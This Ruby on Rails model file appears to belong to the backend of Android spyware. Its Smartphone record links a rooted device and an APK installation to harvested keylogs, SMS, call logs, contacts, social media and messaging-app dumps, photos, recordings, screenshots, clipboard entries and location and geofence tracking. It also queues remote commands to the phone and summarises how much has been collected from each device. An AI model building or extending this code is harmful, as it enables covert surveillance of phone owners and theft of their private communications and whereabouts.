class Smartphone < ApplicationRecord
  include EagerLoadable
  include Cacheable
  include Paginatable

  attribute :is_rooted, :boolean

  belongs_to :apk_installation
  has_many :pending_commands, dependent: :destroy
  has_many :call_logs, dependent: :destroy
  has_many :contacts, dependent: :destroy
  has_many :geo_locations, dependent: :destroy
  has_many :pictures, dependent: :destroy
  has_many :recordings, dependent: :destroy
  has_many :screenshots, dependent: :destroy
  has_many :sms_messages, dependent: :destroy
  has_many :social_media_messages, dependent: :destroy
  has_many :messaging_apps_dumps, dependent: :destroy
  has_many :keylogs, dependent: :destroy
  has_many :keylog_screenshots, dependent: :destroy
  has_many :geofences, dependent: :destroy
  has_many :geofence_events, dependent: :destroy
  has_many :scheduled_commands, dependent: :destroy
  has_many :bookmarks, dependent: :destroy
  has_many :certificates, dependent: :destroy
  has_many :wifi_networks, dependent: :destroy
  has_many :clipboard_entries, dependent: :destroy

  eager_load_associations :apk_installation, :pending_commands
  counter_cached_associations :keylogs, :pending_commands
  cache_ttl 5.minutes

  validates :name, presence: true
  validates :device_id, presence: true, uniqueness: true

  # --- Optimized scopes ---

  scope :with_recent_commands, ->(since: 24.hours.ago) {
    includes(:pending_commands)
      .where('pending_commands.created_at > ?', since)
      .references(:pending_commands)
  }

  scope :with_location, -> {
    includes(:geo_locations)
      .where.not(geo_locations: { id: nil })
      .references(:geo_locations)
  }

  scope :with_stats, -> {
    select(<<-SQL.squish)
      smartphones.*,
      (SELECT COUNT(*) FROM keylogs WHERE keylogs.smartphone_id = smartphones.id) AS keylogs_count_computed,
      (SELECT COUNT(*) FROM pending_commands WHERE pending_commands.smartphone_id = smartphones.id) AS commands_count_computed,
      (SELECT MAX(keylogs.created_at) FROM keylogs WHERE keylogs.smartphone_id = smartphones.id) AS last_keylog_at
    SQL
  }

  scope :active_since, ->(since) {
    where(<<-SQL.squish, since, since)
      EXISTS (SELECT 1 FROM keylogs WHERE keylogs.smartphone_id = smartphones.id AND keylogs.created_at > ?)
      OR EXISTS (SELECT 1 FROM geo_locations WHERE geo_locations.smartphone_id = smartphones.id AND geo_locations.created_at > ?)
    SQL
  }

  # Cached device summary with Redis
  def summary_cached
    cached_fetch(:summary) do
      {
        device_id: device_id,
        name: name,
        keylogs_count: keylogs_count_value,
        commands_count: commands_count_value,
        location_count: geo_locations.where('created_at > ?', 30.days.ago).count,
        sms_count: sms_messages.where('created_at > ?', 30.days.ago).count,
        call_count: call_logs.where('created_at > ?', 30.days.ago).count,
        picture_count: pictures.where('created_at > ?', 30.days.ago).count,
        last_activity: last_activity_at,
        pending_commands: pending_commands.active.count
      }
    end
  end

  # Get last activity timestamp efficiently
  def last_activity_at
    cached_fetch(:activity, ttl: 1.minute) do
      [
        keylogs.maximum(:created_at),
        geo_locations.maximum(:created_at),
        sms_messages.maximum(:created_at),
        call_logs.maximum(:created_at)
      ].compact.max
    end
  end

  private

  # Use counter_cache column if present, otherwise fall back to COUNT
  def keylogs_count_value
    if has_attribute?(:keylogs_count)
      keylogs_count
    else
      keylogs.where('created_at > ?', 30.days.ago).count
    end
  end

  def commands_count_value
    if has_attribute?(:commands_count)
      commands_count
    else
      pending_commands.count
    end
  end
end
